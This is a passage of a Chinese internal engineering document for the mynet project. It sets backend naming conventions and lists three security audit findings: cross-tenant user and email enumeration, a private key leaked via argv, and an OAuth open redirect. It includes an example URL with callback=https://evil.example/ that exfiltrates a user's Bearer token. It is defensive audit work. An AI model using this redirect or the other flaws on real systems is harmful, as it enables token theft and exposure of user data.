### 0.1 命名修正：`mynet_back` / `back` 称谓全部修正

`mynet_back` 仓已改名 `mynet_api`。`mynet_back` 与 `back` 两个称谓在记忆/文档/注释里的描述都要修正，但也不能单叫 `api`（与 localapi、REST 接口、api.mynet.club 域名混淆）。定法：

| 场景 | 用词 |
|---|---|
| 代码/目录/仓名 | `mynet_api`（唯一正式名） |
| 中文表述 | **「后端」**（业务后端）；需带名时写「后端 mynet_api」 |
| 英文表述 | `mynet_api` / `the backend` |
| **废弃称谓** | `mynet_back`、`back`（只许出现在历史归档引文、已发布接口/字段名） |
| 不采用 | 单说 `api` |
| 原样保留（不改代码） | 生产库名 `mynet_back`（改名未授权）、密钥标识 `back_priv`/`back_pub`、已发布接口字段与 URL |

## 3. S1 安全红线（3 条，全量）

1. **[A1] 后端 `GET /users` + `GET /users/search` 是只受 `auth:sanctum` 的跨租户全站用户查询**，search 直出他人 email，`tenant_id` 参数收下但不生效 — `mynet_api/app/Modules/VPN/Controllers/Api/V1/UserController.php:22-27,46-53,91-98`。任意登录用户可枚举全站用户并取邮箱，与 A4 删除 `users/{id}` 的理由（无属主判定层）直接矛盾。处置候选：与 A4 同口径整组下架，或先补属主 Gate。
2. **[C1] 节点私钥经 argv 进执行器并回显到本机 API 响应** — `mynet_agent/mynetd/localapi/config_api.go:185`（`config keys set --private <私钥>` 上命令行）+ `wizard.go:331-333`（sanitize 显式放行 argv，前提「口令走 stdin」被打破）+ `handlers.go:143-151`（失败路径 argv 原样进响应）+ `/api/v1/command` 白名单含 `config`。违反「私钥不进响应/日志」红线，且同机 `ps` 可见。处置候选：改 stdin/0600 临时文件传递（对齐 `auth login --password-stdin`），argv 强制遮蔽 + 回归测试。
3. **[C2] GUI `middleware.ts` 的 OAuth callback 开放重定向把 access token 拼进任意外域 URL** — `mynet_gui/src/router/middleware.ts:22-27`（`to.query.callback` 零校验）。构造 `/auth/login?callback=https://evil.example/` 即可外泄已登录用户 Bearer token。处置候选：callback 白名单（同源/注册回调域），或改一次性 code。
